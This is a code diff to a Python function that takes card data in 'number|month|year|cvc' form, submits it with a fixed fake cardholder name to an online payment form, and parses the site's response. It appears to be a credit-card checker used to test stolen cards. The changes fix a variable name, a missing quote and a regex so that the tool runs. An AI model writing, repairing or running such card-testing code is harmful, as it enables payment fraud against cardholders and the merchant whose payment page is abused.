@@ -10,9 +10,9 @@ def Tele(ccx):
 	yy = ccx.split("|")[2]
 	cvc = ccx.split("|")[3]
 	if n.startswith("4"):
-		CType = "1"
+		Type = "1"
 	if n.startswith("5"):
-		CType = "2"
+		Type = "2"
 	if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
 		mm = mm.split("0")[1]
 	if "20" in yy:
@@ -149,9 +149,9 @@ def Tele(ccx):
 	    '__EVENTVALIDATION': f'{EVENTVALIDATION}',
 	    'nif': '',
 	    'CHName': 'Dao Khao Saard',
-	    'CType': f'{CType}',
+	    'CType': f'{Type}',
 	    'PAN': f'{n}',
-	    'ExpMonth': f'{mm},
+	    'ExpMonth': f'{mm}',
 	    'ExpYear': f'20{yy}',
 	    'CSC': f'{cvc}',
 	    'Continue': 'Continue',
@@ -162,6 +162,6 @@ def Tele(ccx):
 	try:
 	    result = re.search(r'name="dc.description" content="Oh no! It seems like (.*?) You can try to&nbsp;complete the payment again&nbsp;if you think you entered your credit card information incorrectly. Please&nbsp;contact us&nbsp;if you believe there may be other issues."', response.text).group(1)
 	except:
-	    result = re.search(r'name="dc.description" content="(.*?) If you need to make another payment,return to the Payments pageand complete the form again. If you want to get in touch, feel free tosend us a message."', response.text).group(1)
+	    result = re.search(r'name="dc.description" content="(.*?) If you need to make another payment, return to the Payments page and complete the form again. If you want to get in touch, feel free to send us a message."', response.text).group(1)
 	    
 	return (result)
